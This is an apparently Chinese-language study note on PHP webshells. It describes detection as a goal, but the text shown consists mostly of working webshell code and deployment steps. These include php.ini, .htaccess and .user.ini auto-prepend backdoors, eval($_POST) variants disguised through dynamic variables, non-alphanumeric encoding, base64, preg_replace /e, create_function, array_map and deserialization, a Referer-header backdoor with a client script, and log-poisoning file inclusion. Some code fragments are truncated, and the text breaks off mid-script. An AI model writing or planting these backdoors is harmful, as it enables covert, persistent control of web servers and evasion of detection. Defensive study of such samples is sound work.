# PHP Webshell Hidden Learning

## **1. 引言**

本文旨在研究Webshell的各种猥琐编写方式以及webshell后门的生成、检测技术，主要分享了一些webshell的编写方法以及当前对webshell的识别、检测技术的原理以及相应工具的使用，希望能给研究这一领域的朋友带来一点点帮助，同时抛砖引玉，和大家共同讨论更多的技术细节，共同学习成长

**Relevant Link:**

> http://hi.baidu.com/monyer/item/a218dbadf2afc7a828ce9d63\
> http://drops.wooyun.org/tips/839\
> http://1.lanz.sinaapp.com/?p=3\
> http://www.thespanner.co.uk/2011/09/22/non-alphanumeric-code-in-php/\
> http://blog.sucuri.net/2011/09/ask-sucuri-what-about-the-backdoors.html\
> http://www.php-security.org/2010/05/20/mops-submission-07-our-dynamic-php/index.html\
> http://www.freebuf.com/articles/web/11403.html\
> http://zone.wooyun.org/content/5429\
> https://www.virustotal.com/\
> http://www.8090sec.com/suixinbiji/111568.html\
> http://blog.d99net.net/article.asp?id=435\
> http://www.91ri.org/10146.html\
> http://1.lanz.sinaapp.com/?p=3\
> http://www.thespanner.co.uk/2011/09/22/non-alphanumeric-code-in-php/\
> http://blog.sucuri.net/2011/09/ask-sucuri-what-about-the-backdoors.html\
> http://www.php-security.org/2010/05/20/mops-submission-07-our-dynamic-php/index.html\
> http://www.freebuf.com/articles/web/11403.html\
> http://zone.wooyun.org/content/5429\
> https://www.virustotal.com/\
> http://www.8090sec.com/suixinbiji/111568.html\
> http://blog.d99net.net/article.asp?id=435\
> http://www.91ri.org/10146.html

## **2. webshell原理介绍**

来自百度百科的定义:

WebShell就是以asp、php、jsp或者cgi等网页文件形式存在的一种命令执行环境，也可以将其称做为一种网页后门。黑客在入侵了一个网站后，通常会将这些asp或php后门文件与网站服务器

WEB目录下正常的网页文件混在一起，然后就可以使用浏览器来访问这些asp或者php后门，得到一个命令执行环境，以达到控制网站服务器的目的（可以上传下载文件，查看数据库，执行任意程序命令等）

也就是说，webshell也就是一些"正常"的脚本文件(这里说它正常，是从文本的角度来说的)，而webshell的恶意性则是表现在它的实现功能上的，也叫Back Door，是一段带有恶意目的的正常脚本代码(Mareware)

在开始学习webshell的各种奇技淫巧之前，我们要先了解一个基本概念，即webshell的组成，下面是引用Monyer的一篇文章:

![](<../../../.gitbook/assets/image (619).png>)

还有一张是来自drops的一篇paper:

![](<../../../.gitbook/assets/image (618).png>)

即不管webshell的外形怎么改变，它的基本骨架都符合这个结构，即WebShell的实现需要两步：

根据这两个基本点，webshell可以衍生出很多种写法

1、数据的传递:

> 1. $\_GET、$\_POST、$\_COOKIES、$\_FILE...(HTTP包中的任何位置都可以作为payload的传输媒介
> 2. 从远程远程URL中获取数据: file\_get\_contents、curl、svn\_checkout...(将需要执行的指令数据放在远程URL中，通过URL\_INCLUDE来读取)
> 3. 从磁盘文件中获取数据: file、file\_get\_contents...(将需要执行的指令数据放在磁盘文件中，利用IO函数来读取)
> 4. 从数据库中读取(将需要执行的指令放在数据库中，利用数据库函数来读取)
> 5. 从图片头部中获取: exif\_read\_data...(将需要执行的指令数据放在图片头部中，利用图片操作函数来读取)

2、代码执行(将用户传输的数据进行执行)

> 1. eva、system...l执行(这是最普通、标准的代码执行)
> 2. LFI: include、require...(利用浏览器的伪协议将文件包含转化为代码执行)
> 3. 动态函数执行($()...PHP的动态函数特性)
> 4. Curly Syntax(${${...\}}...这种思路可以把变量赋值的漏洞转化为代码执行的机会)

关于webshell的防御，这里我的理解应该做一下区分:

webshell有三大类的问题:

> 1. 由一些CMS应用系统的漏洞导致的getshell，攻击者在注入攻击的那一瞬间进行getshell，这类webshell的防御主要是在对原有应用系统的代码审查上，审核原有的应用系统的代码中是否存在可能导致getshell的"不安全代码"
> 2. 对攻击者写入的webshell代码本身的检测，我们需要了解黑客都会使用哪些种类的奇技淫巧的webshell编写方式，并对这类文件的操作行为进行监控并进行报告
> 3. 还有一种假设的前提是黑客已经获得了一定的对目标服务器的控制权限，黑客为了后续的访问，会留下逻辑后门。这种逻辑后门可以很宽泛的理解一下:&#x20;
>
> > 1. 人工故意放置一个带注入点的文件，并放上正常的文件内容，增加迷惑性，让扫描工具工具和管理员看起来像正常文件
> > 2. 修改服务器配置文件：
> >    1. .htaceess，修改某些扩展名的执行权(例如手工添加 .fackType PHP 这种映射关键的建立).SetHandler application/x-httpd-php: 添加jpg和PHP解析引擎的映射
> >    2. 建立一种逻辑后门。或在php.ini中设置auto\_preload来预加载.php脚本，放置后门代码
> >    3. 修改CMS的配置，放行某些(.php、.asp)的上传权限
> >    4. 人工设置几个包含容易导致漏洞的代码的脚本文件(LFI、命令执行等)

## **3.  webshell的常见类型以及变种方法**

### 0x1:  php.ini隐藏后门

这是php的核心配置文件

在php.ini 中添加:

```php
; Automatically add files before PHP document.
; http://php.net/auto-prepend-file
auto_prepend_file = choop.php
; (auto_prepend_file是在任意PHP脚本的头部)
; (auto_append_file是在任意PHP脚本的尾部)
; (不管头部还是尾部，webshell都能被正常执行)

; LittleHann
include_path = "E:\wamp\www\shell;."
;我们所要include的文件目录放在根目录的前边。不然的话apache会在根目录下搜索我们的后门(当然是没有了从而导致服务器解析php文件失败)
```

在"E:\wamp\www\shell"中创建 choop.php: `1]); ?>`&#x20;

这样可以将webshell藏在磁盘上的任意位置，不一定是要web目录，然后在整个服务器运行期间放置后门

对于这种利用php.ini的webshell部署攻击方式，我们在做攻防研究的时候一定要明白它的攻防场景，一般来说，只有黑客具有了远程修改文件或者已经拿到了目标主机的权限，为了之后的隐蔽访问，而采取的在php.ini中部署一个"后门"，也就是说这种webshell部署更倾向于后门的目的

### 0x2:  .htaccess文件构成的PHP后门

.htaccess是apache的分布式配置文件，.htaccess文件(或者"分布式配置文件")提供了针对不同WEB应用对应的子目录改变配置的方法

.htaccess files (or "distributed configuration files") provide a way to make configuration changes on a per-directory basis. A file, containing one or more configuration directives, is placed in a particular document directory, and the directives apply to that directory, and all subdirectories thereof.

.htaccess文件可以看成是apache核心配置文件的一个子集，按照"就近原则"，.htaccess中的指令可以对httpd.conf进行覆盖，前提是httpd.conf中开启了允许覆盖的开关

在.htaccess中有很多"指令"，详细的指令作用可以参阅官方给出的doc，这里我们重点学习和部署后门WEBSHELL有关的以下几条指令

{% tabs %}
{% tab title="AddHandler" %}
[http://httpd.apache.org/docs/2.2/mod/mod\_mime.html#addhandler](http://httpd.apache.org/docs/2.2/mod/mod\_mime.html#addhandler)&#x20;

1. Description: Maps the filename extensions to the specified handler
2. Syntax: AddHandler handler-name extension \[extension] ...&#x20;
3. Context: server config, virtual host, directory, .htaccess&#x20;
4. Override: FileInfo&#x20;
5. Status: Base&#x20;
6. Module: mod\_mime&#x20;

example: AddHandler php5-script .logs \
将对.logs的后缀文件解析映射到PHP脚本解析器上
{% endtab %}

{% tab title="AddType" %}
[http://httpd.apache.org/docs/2.2/mod/mod\_mime.html#addhandler](http://httpd.apache.org/docs/2.2/mod/mod\_mime.html#addhandler)&#x20;

1. Description: Maps the given filename extensions onto the specified content type&#x20;
2. Syntax: AddType MIME-type extension \[extension] ...&#x20;
3. Context: server config, virtual host, directory, .htaccess&#x20;
4. Override: FileInfo&#x20;
5. Status: Base&#x20;
6. Module: mod\_mime&#x20;

example: AddType text/html .logs\
指定了.logs的后缀的文件的文件扩展类型为"text/html"，这决定了PHP解析这个文件的方式
{% endtab %}

{% tab title="SetHandler" %}
[http://httpd.apache.org/docs/2.2/mod/core.html#sethandler](http://httpd.apache.org/docs/2.2/mod/core.html#sethandler)&#x20;

1. Description: Forces all matching files to be processed by a handler&#x20;
2. Syntax: SetHandler handler-name|None&#x20;
3. Context: server config, virtual host, directory, .htaccess&#x20;
4. Override: FileInfo&#x20;
5. Status: Core&#x20;
6. Module: core&#x20;
7. Compatibility: Moved into the core in Apache 2.0&#x20;

example: SetHandler application/x-httpd-php \
将所有脚本请求都强制指定为使用"application/x-httpd-php"进行解析
{% endtab %}
{% endtabs %}

基于对以上知识的了解，我们来看几种GETSHELL、部署、隐藏WEBSHELL的方式

{% tabs %}
{% tab title="SetHandler" %}
可将php代码存于非php后缀文件，例: x.jpg&#x20;

将以下代码写入.htaccess中&#x20;

```
SetHandler application/x-httpd-php
```

连接x.jpg即可启动后门木马&#x20;

[http://26836659.blogcn.com/articles/利用-htaccess文件来执行php脚本.html](http://26836659.blogcn.com/articles/%E5%88%A9%E7%94%A8-htaccess%E6%96%87%E4%BB%B6%E6%9D%A5%E6%89%A7%E8%A1%8Cphp%E8%84%9A%E6%9C%AC.html)
{% endtab %}

{% tab title="AddHandler、AddType" %}
可将php代码存于非php后缀文件，例: x.logs&#x20;

将以下代码写入.htaccess中&#x20;

```
AddHandler php5-script .logs AddType text/html .logs 
```

连接x.logs，此时x.logs会被apache当成PHP脚本进行解析
{% endtab %}

{% tab title="php_value" %}
将以下代码写入.htaccess中, 文件路径必须是绝对路径，访问网站上任何php文件都会启动该php后门木马 php\_value auto\_append\_file E:/wamp/www/choop.php
{% endtab %}
{% endtabs %}

**Relevant Link:**

> [https://github.com/sektioneins/pcc/wiki/PHP-htaccess-injection-cheat-sheet](https://github.com/sektioneins/pcc/wiki/PHP-htaccess-injection-cheat-sheet) [http://zone.wooyun.org/content/16114](http://zone.wooyun.org/content/16114) \
> [http://httpd.apache.org/docs/2.2/howto/htaccess.html](http://httpd.apache.org/docs/2.2/howto/htaccess.html)

### 0x3:  .user.ini文件构成的PHP后门

.user.ini是php应用的分布式配置文件

和.htaccess的利用思想是一样的，.user.ini也利用分布式的自定义配置文件、从而进行"配置覆盖、劫持"，从而bypass原本的防御逻辑的攻击思想

1. 自PHP 5.3.0起，PHP支持基于每个目录的".htaccess风格"的"INI文件"。此类文件仅被CGI/FastCGI SAPI处理。此功能使得PECL的 htscanner扩展作废。如果使用Apache，则用.htaccess 文件有同样效果&#x20;
2. 除了主php.ini之外，PHP还会在每个目录下扫描INI文件，从被执行的PHP文件所在目录开始一直上升到web根目录($\_SERVER\['DOCUMENT\_ROOT'] 所指定的)。如果被执行的PHP文件在web根目录之外，则只扫描该目录。
3. 在.user.ini风格的INI文件中只有具有\
   PHP\_INI\_PERDIR\
   PHP\_INI\_USER\
   模式的INI设置可被识别&#x20;
4. 两个新的INI指令\
   1\) user\_ini.filename\
   2\) user\_ini.cache\_ttl\
   控制着用户INI文件的使用&#x20;
5. user\_ini.filename设定了PHP会在每个目录下搜寻的文件名\
   &#x20;   1\) 如果设定为空字符串则PHP不会搜寻\
   &#x20;   2\) 默认值是: .user.ini&#x20;
6. user\_ini.cache\_ttl控制着重新读取用户INI文件的间隔时间\
   &#x20;   1\) 默认是300秒

需要注意的是，对于.user.ini这种分布式的配置文件来说，它可以使用的指令集是有限制的

http://php.net/manual/zh/configuration.changes.modes.php

在.user.ini风格的INI文件中只有具有"PHP\_INI\_PERDIR"和"PHP\_INI\_USER"模式的INI设置可被识别，由此我们可以知道，"`.user.ini"`实际上就是一个可以由用户“自定义”的php.ini，我们能够自定义的设置是模式为"PHP\_INI\_PERDIR、PHP\_INI\_USER"的设置

在我们能够自定义的配置指令中，我们可以发现如下几条指令可以被用来进行webshell的部署

![](https://firebasestorage.googleapis.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-MC0hWgbNjaxH4i6ny5D%2Fuploads%2FBG39hBiuxvPUhvdcgQtS%2Ffile.png?alt=media)

这和php.ini的利用思路是一样

而且，和php.ini不同的是，.user.ini是一个能被动态加载的ini文件。也就是说我修改了.user.ini后，不需要重启服务器中间件，只需要等待user\_ini.cache\_ttl所设置的时间(默认为300秒)，即可被重新加载

从这点来说，我们会发现有很多web server具有类似的特性，例如tomcat对于j2ee应用的web.xml文件的变动就会进行自动reload，而不需要重启tomcat server。这是服务器提供的一种特性，而从攻防的角度来看，我们可以有2种利用方式

1. webshell后门部署
2. 服务器配置相关漏洞修复

因为这种分布式配置文件允许安全研究员对子应用而不是整个web server进行小范围的配置修改，从而可以进行配置加固，并且可以获得即时生效的效果

**Relevant Link:**

> [http://php.net/manual/zh/configuration.file.per-user.php](http://php.net/manual/zh/configuration.file.per-user.php) \
> [http://php.net/manual/zh/ini.list.php](http://php.net/manual/zh/ini.list.php) \
> [http://drops.wooyun.org/tips/3424](http://drops.wooyun.org/tips/3424)

### 0x4:  利用PHP动态变量特性 

```php
<?php
    //@eval($_POST['op']);
    @eval(${"_P"."OST"}['op']);
?>

//使用注释符来规避基于黑名单的正则
<?php
    //@eval($_POST['op']);
    @eval($/*aaa*/{"_P"."OST"}['op']);
?>

// 使用其他数据获取方式来获取数据，譬如$_REQUEST、$GLOBALS["_POST"]、$_FILES等。
<?php
    @eval($_REQUEST['op']);
?>
// $_REQUEST 中的变量通过 GET，POST 和 COOKIE 输入机制传递给脚本文件。这个数组的项目及其顺序依赖于 PHP 的variables_order 指令的配置。

<?php
    @eval($GLOBALS['_POST']['op']);
?>

<?php
    @eval($_FILES['name']);
?>
// (然后把payload写在文件名中)
```

### **0x5: tiny php shell**

前提是对方的服务器的php.ini开启了

```
short_open_tag = On
```

```php
2]).@$_($_GET[1])?>

#   http://localhost/shell/choop.php?2=system&1=dir 
```

### 0x6: Non alphanumeric webshell

```php
<?php
$_="";
$_[+$_]++;
$_=$_."";
$___=$_[+""];//A
$____=$___;
$____++;//B
$_____=$____;
$_____++;//C
$______=$_____;
$______++;//D
$_______=$______;
$_______++;//E
$________=$_______;
$________++;$________++;$________++;$________++;$________++;$________++;$________++;$________++;$________++;$________++;//O
$_________=$________;
$_________++;$_________++;$_________++;$_________++;//S
$_=$____.$___.$_________.$_______.'6'.'4'.'_'.$______.$_______.$_____.$________.$______.$_______;
$________++;$________++;$________++;//R
$_____=$_________;
$_____++;//T
$__=$___.$_________.$_________.$_______.$________.$_____;
$__($_("ZXZhbCgkX1BPU1RbMV0p"));   
//ASSERT(BASE64_DECODE("ZXZhbCgkX1BPU1RbMV0p"));
//ASSERT("eval($_POST[1])");
//key:=1
?>
```

### 0x7: 图片木马

{% code title="choop.php" %}
```php
<?php
    $wp__theme_icon=create_function('',file_get_contents('/hacker.gif'));
    $wp__theme_icon();
?>
```
{% endcode %}

hacker.gif: \
phpinfo();

这是图片木马的利用方式的一种  [http://www.php.net/manual/zh/function.create-function.php](http://www.php.net/manual/zh/function.create-function.php)

```php
string create_function ( string $args , string $code )
```

但是这种方法的利用有一个问题，不能像include那样有兼容性，include的情况是允许include进来的语句有错误，PHP会忽略这些错误，而去执行include进来的有效PHP代码

而create\_function('',file\_get\_contents('/hacker.gif')); 这种方法不允许图片中有非法数据(其实就是真实的图片数据)，否则就会出现解析错误，所以黑客只能把纯的木马脚本保存成图片格式而已，这样就可能导致无法绕过图片上传防御机制&#x20;

对于图片木马需要明白的是

1. short\_open\_tag = On\
   由于jpg、gif等格式的图片中，出现这种字符的频率很高，很容易造成PHP解析错误
2. short\_open\_tag = Off\
   这种情况下，图片WEBSHELL的运行较稳定，黑客插入的能够得到稳定的执行

### 0x8: preg\_replace的"/e"执行特性

```php
<?php
    $subject='any_thing_you_can_write';
    $pattern="/^.*$/e";
    $payload='cGhwaW5mbygpOw==';
    //cGhwaW5mbygpOw==: "phpinfo();"
    $replacement=pack('H*', '406576616c286261736536345f6465636f646528')."\"$payload\"))";
    //406576616c286261736536345f6465636f646528: "eval(base64_decode(";
    preg_replace($pattern, $replacement , $subject);
?>

```

PHP [pack()](http://www.w3school.com.cn/php/func\_misc\_pack.asp) 函数，基本上和数据类型的转换是一个类型的函数&#x20;

[preg\_replace](http://cn2.php.net/manual/zh/function.preg-replace.php) — 执行一个正则表达式的搜索和替换&#x20;

```php
mixed preg_replace ( mixed $pattern , mixed $replacement , mixed $subject [, int $limit = -1 [, int &$count ]] ) 

# 搜索subject中匹配pattern的部分， 以replacement进行替换。 当使用e修饰符时, 
# 引擎会将"结果字符串"作为php代码使用eval方式进行评估并将返回值作为最终参与替换的字符串。
```

这个webshell的利用方式的核心在于:&#x20;

1. 这个PHP函数: preg\_replace，它完成了eval的功能&#x20;
2. 这个pack函数，它完成了eval(base64\_decode(...和shellcode\_payload的拼接

preg\_replace还有另一个变种，mb\_ereg\_replace

```php
<?php
  mb_ereg_replace('.*', $_REQUEST['op'], '', 'e');
?>
#  http://php.net/manual/zh/function.mb-ereg-replace.php
```

PHP PCRE的模式pattern的分界符比较灵活，当使用 PCRE 函数的时候，模式需要由分隔符闭合包裹。分隔符可以使任意非字母数字、非反斜线、非空白字符

1. 获取preg\_replace的参数1
2. 开始逐字符扫描，跳过空格，直到匹配到第一个非空格字符
3. 判断当前字符是否是字母数字、反斜线，这些字符是非法的
4. 将第一个成功匹配的字符当成start\_delimiter，继续向后搜索，直到搜索到和start\_delimiter对应的结束标记end\_delimiter
5. 从end\_delimiter位置开始，继续向后搜索，忽略遇到的空格
6. 检测是否出现e字符

对应PHP内核源代码\
/php-5.5.31/ext/pcre/php\_pcre.c

```c
PHPAPI pcre_cache_entry* pcre_get_compiled_regex_cache(char *regex, int regex_len TSRMLS_DC)
{
    ...
    //分隔符有可能是有可能是左右反向对称的、或者左右相同对称的
    start_delimiter = delimiter;
    if ((pp = strchr("([{< )]}> )]}>", delimiter)))
        delimiter = pp[5];
    end_delimiter = delimiter;
    ..
```

preg\_replace的pattern参数可以是数组，所以黑客可以将\e放在数组元素中

**Relevant Link:**

> http://php.net/manual/zh/regexp.reference.delimiters.php

### 0x9: 字符串拼接+PHP的动态函数执行

```php
<?php
    $char_as='as';
    $char_e='e';
    $char_assert=$char_as.'s'.$char_e.'r'.'t';
    $char_base64_decode='b'.$char_as.$char_e.(64).'_'.'d'.$char_e.'c'.'o'.'d'.$char_e;
    @$char_assert(@$char_base64_decode('ZXZhbCgkX1BPU1RbMV0p'));
    //ZXZhbCgkX1BPU1RbMV0p: "eval($_POST[1])"
?>
```

要注意的是，用于动态执行的字符串必须要是"assert"，不能是"eval"，因为在PHP中，eval、die不是函数，而assert是函数

### 0x10: Curly Syntax

```php
<?php 
    $k = "{${phpinfo()}}";
?>

<?php 
   $xsser = $_GET["op"]; 
   @eval("\$safedg = $xsser;") 
?>

# http://localhost/shell/index.php?op=${${fputs(fopen("LittleHann.php", "w+"), "LittleHann")}};

# 这个利用方式很巧妙，这种注入的利用场景是假如应用系统的输入点存在注入点，并且这个输入有机会到达代码的某个变量赋值的代码流位置，黑客可以利用这次"变量赋值"进行一次"代码执行"
```

需要特别注意的是，curl语法代码执行是不能带回显的，即下面这种poc是无法成立的

```php
<?php 
   $xsser = $_GET["op"]; 
   @eval("\$safedg = $xsser;") 
?>
# http://localhost/test/test.php?op=${${'eval($_GET[1])'}}&1=phpinfo();
```

所以curl并不能作为一个webshell指令执行跳板来使用，而只能作为"一次性代码执行且不需要回显"的场景，即向本地磁盘写一个新的webshell文件

### 0x11: 逻辑后门

```php
<?php
    foreach ($_GET as $key => $value)
    {
        //由攻击者添加
        $$key = $value;
    }
    // ... some code
    if (logged_in() || $authenticated)
    {
        //原有逻辑
        // ... administration area
    }
?>

# 或者增加逻辑
if($user_level==ADMIN || $user_name==’monyer’)
{
    //admin area
}

# 或者增加配置
$allow_upload = array(
             ‘jpg’,’gif’,’png’,
             ‘php’,
        );
```

这和拿到CMS后台，然后修改"可允许上传文件类型"，增加.php的做法类似，这是一种"后门思想"&#x20;

这里的情况是黑客已经控制了服务器的一定控制权，在服务器上留后门，黑客可以手动添加这段代码，人工构造本地变量覆盖漏洞，然后黑客在下次攻击的时候就可以进行变量注入，进而控制原始的代码流&#x20;

在其他的情况下,在代码中，常常在`if()`这样的关键跳的位置根据变量进行代码流向判断，而如果应用系统存在任意变量覆盖漏洞，就有可能导致系统本地原本的变量被覆盖，进而导致代码流被黑客控制

### 0x12: LFI导致的代码执行

```php
<?php
    $to_include = $_GET['file'];
    require_once($to_include);
?>

##  这种LFI可能导致黑客将文件包含漏洞升级为代码执行漏洞
##  http://localhost/shell/index.php?file=data:text/plain,
##  http://tools.ietf.org/html/rfc2397
##  data:[][;base64],或者
##  eval(file_get_contents('php://input'));  
```

**Relevant Link:**

> http://www.cnblogs.com/LittleHann/p/3665062.html&#x20;

### 0x13: 动态函数执行

```php
<?php
    $dyn_func = $_GET['dyn_func'];
    $argument = $_GET['argument'];
    $dyn_func($argument);
?>
# http://localhost/shell/index.php?dyn_func=system&argument=dir
```

如果目标服务器开启了: register\_globals=on&#x20;

则webshell还可以这么写

```php
<?php
    $dyn_func($argument);
?>
# http://localhost/shell/index.php?dyn_func=system&argument=dir
```

但是register\_globals这个选项在PHP5.0以后就取消了，即不管php.ini中写On还是Off都没有任何意义

### 0x14: PHP动态创建匿名函数(Lamda表达式)

了动态变量直接动态执行函数，PHP还允许使用[`create_function`](http://cn2.php.net/manual/zh/function.create-function.php)动态的进行"匿名函数(Lamda)"的创建

```php

# string create_function ( string $args , string $code )
<?php
    $foobar = $_GET['foobar'];
    $dyn_func = create_function('$foobar', "echo $foobar;");
    $dyn_func('');
?>
# http://localhost/shell/index.php?foobar=system('dir')
# http://localhost/shell/index.php?foobar=eval('phpinfo();')
# http://localhost/test/test.php?foobar=eval("$_POST[1]") 
```

动态函数的另一种写法：

```php
<?php
    eval("function lambda_n() { echo system('dir'); }");
    lambda_n();
?>
```

```php
<?php
    eval("function lambda_n() { eval($_GET[1]); }");
    lambda_n();
?>
# http://localhost/shell/index.php?1=phpinfo()
```

```php
# 菜刀可连接
<?php
    eval('function lambda_n() { eval($_POST[1]); }');
    lambda_n();
?>
```

这里之所以可以使用`create_function`是因为在PHP内部 `create_function()` 只是对 `eval()`的一层封装，它最终还是使用`eval()`进行代码执行的

create\_function另一种形式

```php
gif89a
<?php
    $_chr = chr(99).chr(104).chr(114); //chr  
    $_eval_post_1 = $_chr(101).$_chr(118).$_chr(97).$_chr(108).$_chr(40).$_chr(36).$_chr(95).$_chr(80).$_chr(79).$_chr(83).$_chr(84).$_chr(91).$_chr(49).$_chr(93).$_chr(41).$_chr(59); //eval($_POST[1]); 
    $_create_function = $_chr(99).$_chr(114).$_chr(101).$_chr(97).$_chr(116).$_chr(101).$_chr(95).$_chr(102).$_chr(117).$_chr(110).$_chr(99).$_chr(116).$_chr(105).$_chr(111).$_chr(110); //create_function 

    $_= $_create_function("",$_eval_post_1); //die(var_dump($_create_function ));
    @$_();
?>
```

### 0x15: 利用系统输出缓存的方法

```php
<?php
    $foobar = 'system';
    ob_start($foobar);
    echo "dir c:";
    ob_end_flush();
?>
```

[`ob_start()`](http://cn2.php.net/manual/zh/function.ob-start.php)会把自己接收到的字符串当作一个"回调函数callback\_func"，并将接下来的缓冲区输入，当作这个"回调函数"的参数

还可以重写ob\_start方法

```php
<?php 
ob_start(function ($c,$d){register_shutdown_function('assert',$c);}); 
echo $_REQUEST['pass']; 
ob_end_flush(); 
?>
```

### 0x16: 利用[assert()](https://www.php.net/manual/zh/function.assert.php)断言来进行代码执行&#x20;

```php
<?php
    $foobar = 'system("dir")';
    assert($foobar);
?>
```

1. 断言这个功能应该只被用来调试
2. 你应该用于完整性检查时测试条件是否始终应该为 TRUE
3. 来指示某些程序错误
4. 或者检查具体功能的存在(类似扩展函数或特定的系统限制和功能)

### 0x17: 数组映射(xxx\_map)类型函数的处理后回调机制导致的代码执行

array\_map — 将回调函数作用到给定数组的单元上

```php
array_map()
usort(),            　　　　　　uasort(),            　　　　uksort()
array_filter()
array_reduce()
array_diff_uassoc(),        　array_diff_ukey()
array_udiff(),            　　array_udiff_assoc(),        array_udiff_uassoc()
array_intersect_assoc(),    　array_intersect_uassoc()
array_uintersect(),        　array_uintersect_assoc(),    array_uintersect_uassoc()
array_walk(),            　　array_walk_recursive()

<?php
    $evil_callback = $_GET['callback'];
    $some_array = array(0, 1, 2, 3);
    $new_array = array_map($evil_callback, $some_array);
?>
# http://localhost/shell/index.php?callback=phpinfo
```

XML的解析也同样存在这个的映射回调问题

```php
xml_set_character_data_handler()
xml_set_default_handler()
xml_set_element_handler()
xml_set_end_namespace_decl_handler()
xml_set_external_entity_ref_handler()
xml_set_notation_decl_handler()
xml_set_processing_instruction_handler()
xml_set_start_namespace_decl_handler()
xml_set_unparsed_entity_decl_handler()


stream_filter_register()
set_error_handler()
register_shutdown_function()
register_tick_function()
```

我们可以利用array\_map的这个特点，将第一个参数(回调函数)作为命令执行管道，第二个参数(callback参数)作为payload传入，从而构将传统的函数调用(payload)的模式转换为array\_map(指令执行，payload)，从而躲避WEBSHELL检测机制

```php
<?php 
    $new_array = array_map("ass\x65rt", (array)$_REQUEST['op']);
?>
//http://localhost/test/test.php?op=eval($_GET[1]): 菜刀密码: 1
```

### 0x18: PHP的序列化、反序列化特性布置后门&#x20;

```php
<?php
    class Example
    {
       var $var = '';
       function __destruct()
       {
          eval($this->var);
       }
    }
    //$exp =  new Example();
    //$exp->var = "phpinfo();";
    //die(serialize($exp));
    unserialize($_GET['saved_code']);
?>
# O:7:"Example":1:{s:3:"var";s:10:"phpinfo();";}  
# http://localhost/shell/index.php?saved_code=O:7:"Example":1:{s:3:"var";s:10:"phpinfo();";}  
```

原理是: 被序列化的对象在反序列化的时候会自动调用它的析构函数

### 0x19: 使用HTTP头部的其他非常用字段进行指令的传输&#x20;

通过HTTP请求中的HTTP\_REFERER来运行经过base64编码的代码，来达到后门的效果。

{% tabs %}
{% tab title="backdoor" %}


```php
<?php
    header('Content-type:text/html;charset=utf-8');
    //将$_SERVER['HTTP_REFERER']中的参数解析到本地变量中，放到$a数组中
    parse_str($_SERVER['HTTP_REFERER'], $a);
    //判断数组变量$a中的第一个元素是否是"10"、并且数组元素个数是否是9个
    if(reset($a) == '10' && count($a) == 9)
    {    
        //取出数组$a中索引6的元素，即我们传入的实际payload，并进行base64_decode解码
        eval(base64_decode(str_replace(" ", "+", implode(array_slice($a, 6)))));
    }
?>
```


{% endtab %}

{% tab title="利用方式" %}


```php
<?php
    header('Content-type:text/html;charset=utf-8');
    //要执行的代码
    $code = "phpinfo();";
    //进行base64编码
    $code = base64_encode($code);
    //构造referer字符串
    $referer = "a=10&b=ab&c=34&d=re&e=32&f=km&g={$code}&h=&i=";
    //后门url
    $url = 'http://localhost/shell/index.php';
    $ch = curl_init();
    $options = array(
        CURLOPT_URL => $url,
        CURLOPT_HEADER => FALSE,
        CURLOPT_RETURNTRANSFER => TRUE,
        CURLOPT_REFERER => $referer
    );
    curl_setopt_array($ch, $options);
    echo curl_exec($ch);
?>

```
{% endtab %}

{% tab title="原理分析" %}
[parse\_str()](http://www.php.net/manual/zh/function.parse-str.php)和extract()作用类似，将外部传入的参数注册为本地变量

&#x20;[`reset()`](http://www.w3school.com.cn/php/func\_array\_reset.asp)函数把数组的内部指针指向第一个元素，并返回这个元素的值

[array\_slice(array,offset,length,preserve) ](http://www.w3school.com.cn/php/func\_array\_slice.asp)\
array\_slice() 函数在数组中根据条件取出一段值，并返回。

[implode](http://www.w3school.com.cn/php/func\_string\_implode.asp)

这个webshell通过编码的referer来传递攻击载荷，HTTP通信的头部的任何字段、或者HTTP的数据部分的任何字段都可以当作webshell的payload来传递数据的。
{% endtab %}
{% endtabs %}

### 0x20: 乱序拼接法&#x20;

```php
<?php  
    @$_="s"."s"."e"."r";  
    @$_="a".$_."t";  
    @$_(${"_P"."OS"."T"}[1-2-5]);
?>  
```

注意这里双层${}的作用，里面那个${}是为了让\_POST\[-6]被解析出来的，如果不用这个花括号，则这个"\_POST\[]"就变成一个纯文本了，加上这个${}之后，变量原本的变量特性就表现出来了， 也就能正确传参了

```php
<?php
    $aaaaa="sewtemznypianol";
    $char_system=$aaaaa{0}.$aaaaa{8}.$aaaaa{0}.$aaaaa{3}.$aaaaa{1}.$aaaaa{5};
    //die($char_system);
    $aaaaaa="edoced46esab_n";
    $char_base64_decode=$aaaaaa{11}.$aaaaaa{10}.$aaaaaa{9}.$aaaaaa{8}.$aaaaaa{7}.$aaaaaa{6}.$aaaaaa{12}.$aaaaaa{5}.$aaaaaa{4}.$aaaaaa{3}.
　　　$aaaaaa{2}.$aaaaaa{1}.$aaaaaa{0};
    die($char_base64_decode);
    echo $char_system($char_base64_decode("aXBjb25maWc="));
?>
```

这种webshell的编写思路很巧妙，和"乱序插入"还不是一个做法

1. "乱序插入"是在一段正常的webshell代码中随机插入一些杂乱的无意义的字母，然后再在下面使用`preg_replace`之类的正则替换来去除掉这些"混淆盐字母"，以还原出原有的正常的 webshell代码&#x20;
2. 这种做法是先定义一个"字母池"，这个"字母池"包含有我们需要构造的关键函数的字符。我们通过从这个字母池中选取特定的索引下的字母，以此来构造出我们想要 的"动态函数"(`system、base64_decode`)

### 0x21：利用apache的错误日志进行webshell的注入&#x20;

用了apche服务器的错误日志文件，当访问一个不存在的连接时,日志中会记录下这样的一句话

\[Tue Jan 14 09:48:01.664731 2014] \[core:error] \[pid 9412:tid 1876] (20024)The given path is misformatted or contained invalid characters: \
\[client ::1:10248] AH00127: Cannot map GET /shell/ HTTP/1.1 to file

这个和很多CMS中的功能很类似，会记录一些运行信息

1. 出错信息，包含导致出错的原始语句，问题也就发生在这里，即用户可能有机会控制这个日志文件的内容
2. 访问记录(例如: 请求URL)，和(1)同样的道理，这属于用户可控的信息
3. 其他的HTTP相关信息

后门back door: 这是留待以后用来引入带后门的日志文件使用的

```php
<?php
    include($_GET['f']);  
?>

# 攻击触发脚本，向日志文件中打入payload
# http://localhost/shell/attack.php



```

```php
<?php  
    // 1. 初始化  
    $ch = curl_init();  
    // 2. 设置选项，包括URL  
    curl_setopt($ch, CURLOPT_URL, "http://localhost/shell/");  
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 0);  
    curl_setopt($ch, CURLOPT_HEADER, 0);  
    curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.1) Gecko/20061204 Firefox/4");  
